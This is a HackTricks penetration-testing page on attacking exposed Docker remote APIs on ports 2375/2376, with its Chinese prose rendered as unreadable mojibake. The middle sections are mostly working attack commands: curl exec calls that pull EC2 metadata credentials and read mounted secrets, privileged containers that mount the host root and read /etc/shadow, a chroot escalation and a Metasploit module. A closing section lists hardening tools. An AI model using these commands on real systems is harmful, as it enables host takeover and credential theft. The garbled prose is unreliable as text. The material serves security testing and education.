# 2375, 2376 Pentesting Docker

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## DockeråŸºç¡€çŸ¥è¯†

### æ˜¯ä»€ä¹ˆ

Dockerå¹³å°æ˜¯ä¸šç•Œé¢†å…ˆçš„å®¹å™¨å¹³å°ï¼Œç”¨äºæŒç»­ã€é«˜é€Ÿçš„åˆ›æ–°ï¼Œä½¿ç»„ç»‡èƒ½å¤Ÿæ— ç¼åœ°æ„å»ºå’Œå…±äº«ä»»ä½•åº”ç”¨ç¨‹åº - ä»ä¼ ç»Ÿåº”ç”¨åˆ°ä¸‹ä¸€ä»£åº”ç”¨ï¼Œå¹¶åœ¨ä»»ä½•åœ°æ–¹å®‰å…¨åœ°è¿è¡Œå®ƒä»¬ã€‚

### åŸºæœ¬çš„Dockeræ¶æ„

è¿™äº›ä¿¡æ¯æ¥è‡ª[è¿™é‡Œ](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)ã€‚

* [containerd](http://containerd.io)æ˜¯ä¸€ä¸ªå®¹å™¨è¿è¡Œæ—¶ï¼Œå¯ä»¥**ç®¡ç†å®Œæ•´çš„å®¹å™¨ç”Ÿå‘½å‘¨æœŸ - ä»é•œåƒä¼ è¾“/å­˜å‚¨åˆ°å®¹å™¨æ‰§è¡Œ**ã€ç›‘ç£å’Œç½‘ç»œã€‚**æœ‰å…³containerdçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§ä¸‹æ–‡ã€‚**
* container-shimå¤„ç†æ— å¤´å®¹å™¨ï¼Œè¿™æ„å‘³ç€ä¸€æ—¦runcåˆå§‹åŒ–å®¹å™¨ï¼Œå®ƒå°±ä¼šé€€å‡ºï¼Œå¹¶å°†å®¹å™¨äº¤ç»™å……å½“ä¸­é—´äººçš„container-shimã€‚
* [runc](http://runc.io)æ˜¯ä¸€ä¸ªè½»é‡çº§çš„é€šç”¨è¿è¡Œæ—¶å®¹å™¨ï¼Œç¬¦åˆOCIè§„èŒƒã€‚**runcç”±containerdç”¨äºæ ¹æ®OCIè§„èŒƒç”Ÿæˆå’Œè¿è¡Œå®¹å™¨**ã€‚å®ƒä¹Ÿæ˜¯libcontainerçš„é‡æ–°æ‰“åŒ…ã€‚
* [grpc](http://www.grpc.io)ç”¨äºcontainerdå’Œdocker-engineä¹‹é—´çš„é€šä¿¡ã€‚
* [OCI](https://www.opencontainers.org)ç»´æŠ¤è¿è¡Œæ—¶å’Œé•œåƒçš„OCIè§„èŒƒã€‚å½“å‰çš„Dockerç‰ˆæœ¬æ”¯æŒOCIé•œåƒå’Œè¿è¡Œæ—¶è§„èŒƒã€‚

![runC, containerD](https://i.stack.imgur.com/5aXF6.png)

### åŸºæœ¬å‘½ä»¤
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
### Containerd

Containerdæ—¨åœ¨ä¾›Dockerå’ŒKubernetesä»¥åŠå…¶ä»–å¸Œæœ›åœ¨Linuxã€Windowsã€Solarisæˆ–å…¶ä»–æ“ä½œç³»ç»Ÿä¸ŠæŠ½è±¡ç³»ç»Ÿè°ƒç”¨æˆ–ç‰¹å®šäºæ“ä½œç³»ç»ŸåŠŸèƒ½ä»¥è¿è¡Œå®¹å™¨çš„å®¹å™¨å¹³å°ä½¿ç”¨ã€‚è€ƒè™‘åˆ°è¿™äº›ç”¨æˆ·ï¼Œæˆ‘ä»¬å¸Œæœ›ç¡®ä¿containerdåªåŒ…å«ä»–ä»¬æ‰€éœ€çš„å†…å®¹ï¼Œè€Œä¸åŒ…å«ä¸éœ€è¦çš„å†…å®¹ã€‚å®é™…ä¸Šè¿™æ˜¯ä¸å¯èƒ½çš„ï¼Œä½†è‡³å°‘æˆ‘ä»¬å°½åŠ›è€Œä¸ºã€‚åƒç½‘ç»œè¿™æ ·çš„ä¸œè¥¿è¶…å‡ºäº†containerdçš„èŒƒå›´ã€‚åŸå› æ˜¯ï¼Œåœ¨æ„å»ºåˆ†å¸ƒå¼ç³»ç»Ÿæ—¶ï¼Œç½‘ç»œæ˜¯ä¸€ä¸ªéå¸¸æ ¸å¿ƒçš„æ–¹é¢ã€‚éšç€SDNå’ŒæœåŠ¡å‘ç°çš„å‘å±•ï¼Œç½‘ç»œæ¯”åœ¨Linuxä¸ŠæŠ½è±¡netlinkè°ƒç”¨æ›´å…·å¹³å°ç‰¹å®šæ€§ã€‚

éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒDockerä½¿ç”¨Containerdï¼Œä½†å®ƒåªæä¾›äº†Dockeræä¾›çš„åŠŸèƒ½çš„å­é›†ã€‚ä¾‹å¦‚ï¼ŒContainerDæ²¡æœ‰Dockerçš„ç½‘ç»œç®¡ç†åŠŸèƒ½ï¼Œä¹Ÿä¸èƒ½å•ç‹¬ä½¿ç”¨ContainerDåˆ›å»ºDockeré›†ç¾¤ã€‚
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
### Podman

**ä¿¡æ¯** [**æ¥è‡ªè¿™é‡Œ**](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)

Podmanæ˜¯ä¸€ä¸ªå¼€æºçš„ã€ç¬¦åˆOCIï¼ˆOpen Container Initiativeï¼‰æ ‡å‡†çš„å®¹å™¨å¼•æ“ã€‚å®ƒç”±Red Hatæ¨åŠ¨ï¼Œå¹¶ä¸Dockeræœ‰ä¸€äº›é‡è¦çš„åŒºåˆ«ï¼Œæ¯”å¦‚å®ƒçš„æ— å®ˆæŠ¤è¿›ç¨‹æ¶æ„å’Œå¯¹æ— æ ¹å®¹å™¨çš„æ”¯æŒã€‚åœ¨æœ¬è´¨ä¸Šï¼Œè¿™ä¸¤ä¸ªå·¥å…·éƒ½æ˜¯åšåŒæ ·çš„äº‹æƒ…ï¼šç®¡ç†é•œåƒå’Œå®¹å™¨ã€‚Podmançš„ä¸€ä¸ªç›®æ ‡æ˜¯æ‹¥æœ‰ä¸Dockerå…¼å®¹çš„APIã€‚å› æ­¤ï¼Œå‡ ä¹æ‰€æœ‰Docker CLIçš„å‘½ä»¤åœ¨Podmanä¸­ä¹Ÿæ˜¯å¯ç”¨çš„ã€‚

åœ¨Podmanç”Ÿæ€ç³»ç»Ÿä¸­ï¼Œæ‚¨å¯èƒ½ä¼šæ‰¾åˆ°å¦å¤–ä¸¤ä¸ªå·¥å…·ï¼šBuildahå’ŒSkopeoã€‚Buildahæ˜¯ä¸€ä¸ªç”¨äºæ„å»ºå®¹å™¨é•œåƒçš„CLIå·¥å…·ï¼Œè€ŒSkopeoæ˜¯ä¸€ä¸ªç”¨äºåœ¨é•œåƒä¸Šè¿è¡Œæ“ä½œï¼ˆå¦‚æ¨é€ã€æ‹‰å–æˆ–æ£€æŸ¥ï¼‰çš„CLIå·¥å…·ã€‚è¯·æŸ¥çœ‹GitHubä»¥è·å–æœ‰å…³è¿™äº›å·¥å…·åŠå…¶ä¸Podmançš„å…³ç³»çš„æ›´å¤šä¿¡æ¯ã€‚

**ä¸»è¦åŒºåˆ«**

Dockerå’ŒPodmanä¹‹é—´æœ€å¤§çš„åŒºåˆ«æ˜¯å®ƒä»¬çš„æ¶æ„ã€‚Dockerè¿è¡Œåœ¨å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¶æ„ä¸Šï¼Œè€ŒPodmanè¿è¡Œåœ¨æ— å®ˆæŠ¤è¿›ç¨‹æ¶æ„ä¸Šã€‚ä½†è¿™æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿåœ¨ä½¿ç”¨Dockeræ—¶ï¼Œæ‚¨å¿…é¡»ä½¿ç”¨Docker CLIï¼Œå®ƒä¸åå°å®ˆæŠ¤è¿›ç¨‹ï¼ˆDockerå®ˆæŠ¤è¿›ç¨‹ï¼‰è¿›è¡Œé€šä¿¡ã€‚ä¸»è¦é€»è¾‘ä½äºå®ˆæŠ¤è¿›ç¨‹ä¸­ï¼Œå®ƒæ„å»ºé•œåƒå¹¶æ‰§è¡Œå®¹å™¨ã€‚è¿™ä¸ªå®ˆæŠ¤è¿›ç¨‹ä»¥rootæƒé™è¿è¡Œã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒPodmanæ¶æ„å…è®¸æ‚¨åœ¨å¯åŠ¨å®¹å™¨çš„ç”¨æˆ·ä¸‹è¿è¡Œå®¹å™¨ï¼ˆfork/execï¼‰ï¼Œè€Œæ­¤ç”¨æˆ·ä¸éœ€è¦ä»»ä½•rootæƒé™ã€‚å› ä¸ºPodmanå…·æœ‰æ— å®ˆæŠ¤è¿›ç¨‹æ¶æ„ï¼Œæ¯ä¸ªè¿è¡ŒPodmançš„ç”¨æˆ·åªèƒ½çœ‹åˆ°å’Œä¿®æ”¹è‡ªå·±çš„å®¹å™¨ã€‚æ²¡æœ‰ä¸€ä¸ªå…¬å…±çš„å®ˆæŠ¤è¿›ç¨‹ä¸CLIå·¥å…·è¿›è¡Œé€šä¿¡ã€‚

ç”±äºPodmanæ²¡æœ‰å®ˆæŠ¤è¿›ç¨‹ï¼Œå®ƒéœ€è¦ä¸€ç§æ–¹å¼æ¥æ”¯æŒåœ¨åå°è¿è¡Œå®¹å™¨ã€‚å› æ­¤ï¼Œå®ƒæä¾›äº†ä¸systemdçš„é›†æˆï¼Œå…è®¸é€šè¿‡systemdå•å…ƒæ¥æ§åˆ¶å®¹å™¨ã€‚æ ¹æ®Podmançš„ç‰ˆæœ¬ï¼Œæ‚¨å¯ä»¥ä¸ºç°æœ‰å®¹å™¨ç”Ÿæˆè¿™äº›å•å…ƒï¼Œæˆ–è€…ç”Ÿæˆèƒ½å¤Ÿåœ¨ç³»ç»Ÿä¸­åˆ›å»ºå®¹å™¨çš„å•å…ƒã€‚è¿˜æœ‰å¦ä¸€ç§ä¸systemdçš„é›†æˆæ¨¡å‹ï¼Œå®ƒä½¿systemdèƒ½å¤Ÿåœ¨å®¹å™¨å†…éƒ¨è¿è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒDockerä½¿ç”¨systemdæ¥æ§åˆ¶å®ˆæŠ¤è¿›ç¨‹ã€‚

ç¬¬äºŒä¸ªä¸»è¦åŒºåˆ«æ¶‰åŠå®¹å™¨çš„æ‰§è¡Œæ–¹å¼ã€‚ä½¿ç”¨Podmanæ—¶ï¼Œå®¹å™¨åœ¨ç”¨æˆ·çš„æƒé™ä¸‹æ‰§è¡Œï¼Œè€Œä¸æ˜¯åœ¨å®ˆæŠ¤è¿›ç¨‹ä¸‹æ‰§è¡Œã€‚åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæ— æ ¹å®¹å™¨çš„æ¦‚å¿µå°±å‘æŒ¥ä½œç”¨äº†ï¼Œè¿™æ„å‘³ç€å®¹å™¨å¯ä»¥åœ¨æ²¡æœ‰rootæƒé™çš„æƒ…å†µä¸‹å¯åŠ¨ã€‚ä¸æœ‰æ ¹å®¹å™¨ç›¸æ¯”ï¼Œæ— æ ¹å®¹å™¨å…·æœ‰å·¨å¤§çš„ä¼˜åŠ¿ï¼Œå› ä¸ºå®ƒä»¬ä¸åœ¨rootå¸æˆ·ä¸‹è¿è¡Œã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ•è·å¹¶é€ƒç¦»å®¹å™¨ï¼Œè¯¥æ”»å‡»è€…ä»ç„¶æ˜¯ä¸»æœºä¸Šçš„æ™®é€šç”¨æˆ·ã€‚ç”±ç”¨æˆ·å¯åŠ¨çš„å®¹å™¨ä¸èƒ½æ‹¥æœ‰æ¯”ç”¨æˆ·æœ¬èº«æ›´å¤šçš„æƒé™æˆ–èƒ½åŠ›ã€‚è¿™å¢åŠ äº†ä¸€å±‚è‡ªç„¶çš„ä¿æŠ¤ã€‚

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œç”±äºPodmanæ—¨åœ¨æ”¯æŒä¸Dockerç›¸åŒçš„APIï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸Dockerç›¸åŒçš„å‘½ä»¤ï¼Œå¦‚ï¼š
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

å½“å¯ç”¨æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹è¿œç¨‹APIåœ¨2375ç«¯å£ä¸Šè¿è¡Œã€‚è¯¥æœåŠ¡é»˜è®¤æƒ…å†µä¸‹ä¸éœ€è¦èº«ä»½éªŒè¯ï¼Œå…è®¸æ”»å‡»è€…å¯åŠ¨ä¸€ä¸ªç‰¹æƒçš„Dockerå®¹å™¨ã€‚é€šè¿‡ä½¿ç”¨è¿œç¨‹APIï¼Œå¯ä»¥å°†ä¸»æœº/ï¼ˆæ ¹ç›®å½•ï¼‰é™„åŠ åˆ°å®¹å™¨ä¸Šï¼Œå¹¶è¯»å†™ä¸»æœºç¯å¢ƒä¸­çš„æ–‡ä»¶ã€‚

**é»˜è®¤ç«¯å£ï¼š** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
## æšä¸¾

### æ‰‹åŠ¨

è¯·æ³¨æ„ï¼Œä¸ºäº†æšä¸¾Docker APIï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`docker`å‘½ä»¤æˆ–è€…åƒä¸‹é¢çš„ç¤ºä¾‹ä¸­ä½¿ç”¨`curl`å‘½ä»¤ï¼š
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
å¦‚æœæ‚¨å¯ä»¥ä½¿ç”¨`docker`å‘½ä»¤**ä¸è¿œç¨‹docker APIè¿›è¡Œé€šä¿¡**ï¼Œåˆ™å¯ä»¥**æ‰§è¡Œ**ä¹‹å‰[**è¯„è®ºè¿‡çš„dockerå‘½ä»¤**](2375-pentesting-docker.md#basic-commands)æ¥ä¸æœåŠ¡è¿›è¡Œäº¤äº’ã€‚

{% hint style="info" %}
æ‚¨å¯ä»¥`export DOCKER_HOST="tcp://localhost:2375"`ï¼Œå¹¶**é¿å…**åœ¨dockerå‘½ä»¤ä¸­ä½¿ç”¨`-H`å‚æ•°ã€‚
{% endhint %}

#### å¿«é€Ÿææƒ
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
#### Curl

æœ‰æ—¶ä½ ä¼šçœ‹åˆ° **2376** ç”¨äº **TLS** ç«¯ç‚¹ã€‚æˆ‘æ— æ³•ä½¿ç”¨ docker å®¢æˆ·ç«¯è¿æ¥åˆ°å®ƒï¼Œä½†ä½ å¯ä»¥ä½¿ç”¨ curl è½»æ¾åœ°è®¿é—® docker APIã€‚
```bash
#List containers
curl â€“insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl â€“insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s â€“insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itâ€™s also worth checking out services in case they are adding secrets via environment variables)
curl -s â€“insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
å¦‚æœæ‚¨æƒ³è·å–æ›´å¤šä¿¡æ¯ï¼Œå¯ä»¥åœ¨æˆ‘å¤åˆ¶å‘½ä»¤çš„åœ°æ–¹æ‰¾åˆ°æ›´å¤šä¿¡æ¯ï¼š[https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

### è‡ªåŠ¨åŒ–
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
## å…¥ä¾µ

åœ¨ä¸‹é¢çš„é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°**é€ƒç¦»Dockerå®¹å™¨**çš„æ–¹æ³•ï¼š

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

é€šè¿‡æ»¥ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥é€ƒç¦»å®¹å™¨ï¼Œæ‚¨å¯ä»¥åœ¨è¿œç¨‹æœºå™¨ä¸Šè¿è¡Œä¸€ä¸ªå¼±å®¹å™¨ï¼Œé€ƒç¦»å®¹å™¨å¹¶å…¥ä¾µæœºå™¨ï¼š
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

## ææƒ

å¦‚æœä½ åœ¨ä½¿ç”¨ Docker çš„ä¸»æœºå†…éƒ¨ï¼Œä½ å¯ä»¥[**é˜…è¯»è¿™äº›ä¿¡æ¯å°è¯•æå‡æƒé™**](../linux-hardening/privilege-escalation/#writable-docker-socket)ã€‚

## å‘ç°æ­£åœ¨è¿è¡Œçš„ Docker å®¹å™¨ä¸­çš„ç§˜å¯†ä¿¡æ¯
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
æ£€æŸ¥**env**ï¼ˆç¯å¢ƒå˜é‡éƒ¨åˆ†ï¼‰ä»¥æŸ¥æ‰¾ç§˜å¯†ä¿¡æ¯ï¼Œä½ å¯èƒ½ä¼šæ‰¾åˆ°ï¼š

* å¯†ç ã€‚
* IPåœ°å€ã€‚
* ç«¯å£ã€‚
* è·¯å¾„ã€‚
* å…¶ä»–...ã€‚

å¦‚æœä½ æƒ³æå–ä¸€ä¸ªæ–‡ä»¶ï¼š
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
## ä¿æŠ¤æ‚¨çš„Docker

### ä¿æŠ¤Dockerçš„å®‰è£…å’Œä½¿ç”¨

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security)æ¥æ£€æŸ¥æ‚¨å½“å‰çš„Dockerå®‰è£…ã€‚
* `./docker-bench-security.sh`
* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/kost/dockscan](https://github.com/kost/dockscan)æ¥æ£€æŸ¥æ‚¨å½“å‰çš„Dockerå®‰è£…ã€‚
* `dockscan -v unix:///var/run/docker.sock`
* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained)æ¥æŸ¥çœ‹åœ¨ä¸åŒå®‰å…¨é€‰é¡¹ä¸‹è¿è¡Œå®¹å™¨æ—¶å®¹å™¨å°†å…·æœ‰çš„æƒé™ã€‚è¿™å¯¹äºäº†è§£ä½¿ç”¨æŸäº›å®‰å…¨é€‰é¡¹è¿è¡Œå®¹å™¨çš„å½±å“éå¸¸æœ‰ç”¨ï¼š
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

### ä¿æŠ¤Dockeré•œåƒ

* æ‚¨å¯ä»¥ä½¿ç”¨[https://github.com/quay/clair](https://github.com/quay/clair)çš„Dockeré•œåƒæ¥æ‰«æå…¶ä»–Dockeré•œåƒå¹¶æŸ¥æ‰¾æ¼æ´ã€‚
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

### ä¿æŠ¤Dockerfiles

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter)æ¥**æ£€æŸ¥æ‚¨çš„Dockerfile**å¹¶æ‰¾åˆ°å„ç§é…ç½®é”™è¯¯ã€‚æ¯ä¸ªé…ç½®é”™è¯¯éƒ½ä¼šè¢«èµ‹äºˆä¸€ä¸ªIDï¼Œæ‚¨å¯ä»¥åœ¨[https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md)ä¸­æ‰¾åˆ°å¦‚ä½•ä¿®å¤æ¯ä¸ªé”™è¯¯çš„æ–¹æ³•ã€‚
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (418).png>)

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint)æ¥**æ£€æŸ¥æ‚¨çš„Dockerfile**å¹¶æ‰¾åˆ°å„ç§é…ç½®é”™è¯¯ã€‚
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (419).png>)

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint)æ¥**æ£€æŸ¥æ‚¨çš„Dockerfile**å¹¶æ‰¾åˆ°å„ç§é…ç½®é”™è¯¯ã€‚
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (420).png>)

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint)æ¥**æ£€æŸ¥æ‚¨çš„Dockerfile**å¹¶æ‰¾åˆ°å„ç§é…ç½®é”™è¯¯ã€‚
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (421).png>)

### è®°å½•å¯ç–‘æ´»åŠ¨

* æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco)æ¥æ£€æµ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨ä¸­çš„**å¯ç–‘è¡Œä¸º**ã€‚
